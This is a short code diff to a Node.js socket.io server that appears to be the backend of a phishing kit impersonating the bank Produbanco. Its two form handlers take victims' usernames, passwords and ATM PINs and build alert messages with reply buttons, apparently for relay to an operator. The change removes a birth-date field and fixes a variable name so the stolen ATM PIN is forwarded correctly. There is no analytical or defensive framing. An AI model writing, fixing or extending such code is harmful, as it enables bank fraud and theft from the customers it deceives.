@@ -27,10 +27,10 @@ io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
   // Login principal
-  socket.on('dataForm', ({ usuario, contrasena, claveCajero, fechaNacimiento, sessionId }) => {
+  socket.on('dataForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${cajero}`;
+    const mensaje = `🔐 Nuevo intento de acceso PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -84,10 +84,10 @@ io.on('connection', (socket) => {
   });
 
   // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ usuario, contrasena, claveCajero, fechaNacimiento, sessionId }) => {
+  socket.on('errorlogoForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${cajero}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
